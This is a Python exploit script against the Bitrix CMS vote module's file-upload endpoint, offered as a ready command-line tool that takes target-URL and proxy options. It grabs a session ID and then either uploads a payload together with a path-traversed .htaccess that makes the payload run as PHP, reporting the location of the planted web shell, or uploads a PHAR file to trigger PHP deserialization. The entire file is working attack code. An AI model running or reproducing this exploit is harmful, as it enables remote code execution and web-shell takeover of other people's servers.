import requests
import sys
import argparse
import json
import random
import urllib.parse
import io
import pathlib
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_bitrix_sessid(sess, url, kwargs):
    r = sess.get(f"{url}/bitrix/tools/composite_data.php", **kwargs)
    data = json.loads(r.text.replace("'", '"'))
    return data["bitrix_sessid"]


def make_file(name, content):
    f = io.BytesIO(content)
    f.name = name
    return f


def upload_files(sess, url, sessid, payloads, kwargs):
    cid = "CID" + str(random.randint(1000000000000, 9999999999999))
    pindex = "pIndex" + str(random.randint(1000000000000, 9999999999999))

    files = {
        "bxu_info[CID]": (None, cid),
        "bxu_info[packageIndex]": (None, pindex),
        "bxu_info[filesCount]": (None, str(len(payloads))),
        "bxu_info[mode]": (None, "upload"),
    }

    params = {
        "attachId[MODULE_ID]": "iblock",
        "attachId[ENTITY_TYPE]": "CFileUploader",
        "action": "vote",
        "sessid": sessid,
    }

    for i, f in enumerate(payloads):
        files[f"bxu_files[{i}][name]"] = (None, "1")
        files[f"bxu_files[{i}][{f.name}]"] = f
        params[f"attachId[ENTITY_ID][copies][{f.name}]"] = "1"

    r = sess.post(
        f"{url}/bitrix/tools/vote/uf.php",
        params=params,
        files=files,
        **kwargs,
    )

    paths = {}

    try:
        data = r.json()
        for fname, info in data["files"][0]["file"]["files"].items():
            if fname == "default":
                continue
            paths[fname] = info["tmp_name"]
    except Exception:
        raise Exception(f"Fail to upload files, bad response:\n {r.text}")

    return paths


def mode_upload(sess, url, sessid, payload, payload_name, kwargs):
    ext = pathlib.Path(payload_name).suffix

    paths = upload_files(
        sess,
        url,
        sessid,
        [
            make_file(payload_name, payload.read()),
            make_file(
                "../.htaccess", f"AddHandler application/x-httpd-php {ext}\n".encode()
            ),
        ],
        kwargs,
    )

    return paths[payload_name]


def mode_unserialize(sess, url, sessid, payload, payload_name, kwargs):
    print("[*] uploading PHAR")
    paths = upload_files(
        sess,
        url,
        sessid,
        [
            make_file(payload_name, payload.read()),
        ],
        kwargs,
    )

    path = paths[payload_name]

    params = {
        "attachId[MODULE_ID]": "iblock",
        "attachId[ENTITY_TYPE]": "Phar",
        "attachId[ENTITY_ID]": path,
        "action": "vote",
        "sessid": sessid,
    }

    print("[*] access uploaded PHAR to trigger unserialize")
    sess.post(
        f"{url}/bitrix/tools/vote/uf.php",
        params=params,
        **kwargs,
    )


def main():
    parser = argparse.ArgumentParser(description="Bitrix Vote module exploit")

    parser.add_argument(
        "-u",
        "--url",
        metavar="url",
        type=str,
        help="target URL",
        required=True,
    )
    parser.add_argument(
        "-p",
        "--payload",
        metavar="payload",
        type=argparse.FileType("rb"),
        help="path to payload file",
        required=True,
    )
    parser.add_argument(
        "-a",
        "--user-agent",
        metavar="user_agent",
        type=str,
        help="User-Agent header",
        default="Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    )
    parser.add_argument(
        "-x",
        "--proxy",
        metavar="proxy",
        type=str,
        help="Proxy URL",
    )

    subparsers = parser.add_subparsers(dest="sub")

    subparsers.add_parser("unserialize")
    subparsers.add_parser("upload")

    args = parser.parse_args()

    ext = pathlib.Path(args.payload.name).suffix

    if (args.sub == "upload" and ext == ".php") or (
        args.sub == "unserialize" and ext != ".phar"
    ):
        print("[*] invalid payload extension")
        sys.exit(1)

    url = urllib.parse.urlparse(args.url)

    kwargs = {
        "proxies": {
            "http": args.proxy,
            "https": args.proxy,
        },
        "headers": {
            "User-Agent": args.user_agent,
            "Accept": "*/*",
            "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Bx-ajax": "true",
            "Origin": url.netloc,
        },
        "verify": False,
    }

    sess = requests.Session()

    try:
        print("[*] getting sessid")
        bitrix_sessid = get_bitrix_sessid(sess, args.url, kwargs)
    except requests.exceptions.ConnectionError:
        print(f"[!] fail to connect to {args.url}")
        sys.exit(1)
    print(f"[*] sessid = {bitrix_sessid}")

    try:
        if args.sub == "upload":
            print("[*] mode upload")
            path = mode_upload(
                sess,
                args.url,
                bitrix_sessid,
                args.payload,
                args.payload.name,
                kwargs,
            )
            parts = path.split("/")
            shell_path = "/".join(parts[parts.index("upload") :])
            print(f"[*] success! Shell path {args.url}/{shell_path}")
        elif args.sub == "unserialize":
            print("[*] mode unserialize")
            mode_unserialize(
                sess,
                args.url,
                bitrix_sessid,
                args.payload,
                args.payload.name,
                kwargs,
            )
    except Exception as e:
        print(f"[!] error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
